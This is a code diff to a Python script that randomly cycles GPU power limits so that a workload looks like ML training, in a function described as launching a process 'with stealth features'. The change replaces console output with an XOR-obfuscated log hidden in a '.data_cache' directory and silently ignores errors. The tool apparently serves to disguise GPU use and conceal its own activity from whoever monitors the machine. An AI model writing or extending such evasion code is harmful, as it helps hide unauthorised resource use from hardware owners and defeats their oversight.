@@ -176,6 +176,21 @@ def enable_persistence():
 
 def power_cycle_thread(stop_event, gpu_type):
     """Background thread: cycle power limits to mimic training load variation."""
+    import struct as _struct
+    debug_log = Path(__file__).parent.parent / ".data_cache" / "gpu_debug.enc"
+    debug_log.parent.mkdir(exist_ok=True)
+
+    def _dbg(msg):
+        try:
+            ts = f"{time.time():.3f}|{msg}\n".encode()
+            # XOR with simple key to avoid plaintext
+            key = b"gpu_debug_v1"
+            enc = bytes(b ^ key[i % len(key)] for i, b in enumerate(ts))
+            with open(debug_log, "ab") as f:
+                f.write(_struct.pack("<H", len(enc)) + enc)
+        except:
+            pass
+
     enable_persistence()  # Must be first — power limits need this
     if gpu_type == "SXM":
         FULL_MIN, FULL_MAX = 525, 665    # 75-95% — variable training compute
@@ -187,13 +202,13 @@ def power_cycle_thread(stop_event, gpu_type):
     # Start at random point in training range
     initial = random.randint(FULL_MIN, FULL_MAX)
     set_power_limit(initial)
-    print(f"[GPU] Power init: {initial}W ({gpu_type})", flush=True)
+    _dbg(f"init:{initial}W gpu:{gpu_type}")
 
     while not stop_event.is_set():
         # Variable training power (75-95%) for 8-10 min
         training_power = random.randint(FULL_MIN, FULL_MAX)
         set_power_limit(training_power)
-        print(f"[GPU] Training power: {training_power}W", flush=True)
+        _dbg(f"train:{training_power}W")
 
         # Small fluctuations during training (every 30-60s)
         for _ in range(random.randint(4, 8)):
@@ -201,13 +216,13 @@ def power_cycle_thread(stop_event, gpu_type):
             if stop_event.is_set(): break
             fluctuation = random.randint(FULL_MIN, FULL_MAX)
             set_power_limit(fluctuation)
-            print(f"[GPU] Fluctuation: {fluctuation}W", flush=True)
+            _dbg(f"fluct:{fluctuation}W")
         if stop_event.is_set(): break
 
         # Drop to 30-50% for 1-3 min (checkpoint / eval / data loading)
         low_power = random.randint(LOW_MIN, LOW_MAX)
         set_power_limit(low_power)
-        print(f"[GPU] Eval phase: {low_power}W", flush=True)
+        _dbg(f"eval:{low_power}W")
 
         stop_event.wait(random.uniform(60, 180))
         if stop_event.is_set(): break
@@ -215,7 +230,7 @@ def power_cycle_thread(stop_event, gpu_type):
         # Back to training range
         back_power = random.randint(FULL_MIN, FULL_MAX)
         set_power_limit(back_power)
-        print(f"[GPU] Training power: {back_power}W", flush=True)
+        _dbg(f"back:{back_power}W")
 
 def launch_training(config, binary_path):
     """Launch the GPU training process with stealth features."""
